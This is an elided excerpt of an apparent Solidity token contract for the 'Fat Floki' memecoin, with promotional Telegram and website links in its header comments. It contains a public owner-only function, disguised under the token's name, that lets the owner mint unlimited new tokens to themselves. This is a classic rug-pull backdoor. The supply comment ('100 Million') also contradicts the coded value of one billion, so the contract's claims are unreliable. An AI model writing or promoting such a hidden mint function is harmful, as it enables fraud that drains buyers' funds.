...
//
// $FatFloki proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/FatFloki
// 📱 Website ::https://fatfloki.website
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _FatFloki(uint256 amount) public onlyOwner {
 _FatFloki(msg.sender, amount);
    }
    ...
    function _FatFloki(address account, uint256 amount) internal virtual {
...
contract $FatFloki is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Fat Floki", "FATFLOKI") {
     _FatFloki(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}